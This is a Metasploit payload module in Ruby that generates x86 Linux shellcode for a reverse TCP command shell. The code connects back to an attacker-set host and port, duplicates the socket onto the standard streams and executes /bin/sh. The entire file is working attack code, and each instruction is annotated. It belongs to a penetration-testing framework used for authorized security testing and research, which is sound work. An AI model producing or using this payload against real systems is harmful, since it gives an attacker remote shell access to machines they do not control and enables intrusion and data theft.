##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 68

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        => ['Ramon de C Valle', 'joev'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix
    ))

    register_options([
      OptString.new('CMD', [ true, "The command string to execute", "/bin/sh" ])
    ])
  end

  def generate
    # pad the shell path to a multiple of 4 with slashes
    shell = datastore['CMD']
    remainder = shell.bytes.length % 4
    if remainder == 0 then remainder = 4 end
    shell_padded = ("/" * (4-remainder)) + shell

    "\x31\xdb"             + #   xor ebx,ebx
    "\xf7\xe3"             + #   mul ebx
    "\x53"                 + #   push ebx
    "\x43"                 + #   inc ebx
    "\x53"                 + #   push ebx
    "\x6a\x02"             + #   push byte +0x2
    "\x89\xe1"             + #   mov ecx,esp
    "\xb0\x66"             + #   mov al,0x66 (sys_socketcall)
    "\xcd\x80"             + #   int 0x80
    "\x93"                 + #   xchg eax,ebx
    "\x59"                 + #   pop ecx
    "\xb0\x3f"             + #   mov al,0x3f (sys_dup2)
    "\xcd\x80"             + #   int 0x80
    "\x49"                 + #   dec ecx
    "\x79\xf9"             + #   jns 0x11
    "\x68" + [IPAddr.new(datastore['LHOST'], Socket::AF_INET).to_i].pack('N') + #   push ip addr
    "\x68\x02\x00" + [datastore['LPORT'].to_i].pack('S>') + #   push port
    "\x89\xe1"             + #   mov ecx,esp
    "\xb0\x66"             + #   mov al,0x66 (sys_socketcall)
    "\x50"                 + #   push eax
    "\x51"                 + #   push ecx
    "\x53"                 + #   push ebx
    "\xb3\x03"             + #   mov bl,0x3
    "\x89\xe1"             + #   mov ecx,esp
    "\xcd\x80"             + #   int 0x80
    "\x52"                 + #   push edx

    # Split shellname into 4-byte words and push them one-by-one
    # on to the stack
    shell_padded.bytes.reverse.each_slice(4).map do |word|
      "\x68" + word.reverse.pack('C*')
    end.join +

    "\x89\xe3"             + #   mov ebx,esp
    "\x52"                 + #   push edx
    "\x53"                 + #   push ebx
    "\x89\xe1"             + #   mov ecx,esp
    "\xb0\x0b"             + #   mov al,0xb (execve)
    "\xcd\x80"              #   int 0x80
  end
end
